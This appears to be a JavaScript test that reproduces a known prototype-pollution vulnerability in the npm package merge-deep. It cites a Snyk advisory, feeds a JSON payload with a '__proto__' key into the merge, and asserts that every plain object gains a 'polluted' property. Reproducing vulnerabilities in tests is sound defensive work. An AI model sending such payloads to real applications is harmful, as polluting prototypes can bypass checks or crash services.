// https://snyk.io/vuln/npm:merge-deep:20180215
test("prototype pollution in merge-deep", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require("merge-deep");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
